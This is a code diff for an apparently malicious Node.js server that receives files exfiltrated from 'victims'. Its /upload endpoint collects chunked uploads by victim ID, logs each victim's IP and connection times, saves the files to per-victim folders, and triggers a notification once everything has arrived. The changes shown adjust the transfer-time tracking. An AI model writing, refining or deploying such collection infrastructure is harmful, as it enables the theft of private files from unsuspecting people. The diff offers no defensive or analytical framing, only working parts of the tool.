@@ -53,13 +53,13 @@ const victimTotalFiles = {};
 const connectedDevices = {};
 const chunkTracker = new Map();
 
-// Helper to check all files received (future email trigger)
+// Helper to check all files received
 function checkAndSendEmail(victimId, victimFolder) {
     const filesInFolder = fs.readdirSync(victimFolder);
     if (filesInFolder.length === victimTotalFiles[victimId]) {
         console.log(`✅ All files received for victim ${victimId}`);
 
-        const timeTaken = Date.now() - connectedDevices[victimId].connectionTime;
+        const timeTaken = Date.now() - connectedDevices[victimId].startTransferTime;
         connectedDevices[victimId].totalUploadTime = (timeTaken / 1000).toFixed(2);
 
         console.log(`⏱️ Total upload time for ${victimId}: ${connectedDevices[victimId].totalUploadTime} seconds`);
@@ -96,11 +96,12 @@ app.post('/upload', (req, res) => {
             connectedDevices[victimId] = {
                 ip: ip,
                 connectionTime: Date.now(),
+                startTransferTime: Date.now(), // Start time when first file chunk is received
                 filesTransferred: 0,
                 fileList: [],
-                fileTimers: {},        // Start time per file
-                fileEndTimes: {},      // End time per file
-                fileDurations: {}      // Transfer time per file
+                fileTimers: {},       
+                fileEndTimes: {},     
+                fileDurations: {}     
             };
         }
 
@@ -133,14 +134,7 @@ app.post('/upload', (req, res) => {
             }
 
             if (victimFileCounts[victimId] === totalChunks) {
-                const startTime = connectedDevices[victimId].fileTimers[filename];
-                const endTime = Date.now();
-                const duration = ((endTime - startTime) / 1000).toFixed(2);
-
-                connectedDevices[victimId].fileEndTimes[filename] = new Date(endTime).toISOString();
-                connectedDevices[victimId].fileDurations[filename] = duration;
-
-                console.log(`✅ File ${filename} received completely in ${duration} seconds`);
+                console.log(`✅ File ${filename} received completely`);
 
                 checkAndSendEmail(victimId, victimFolder);
             }
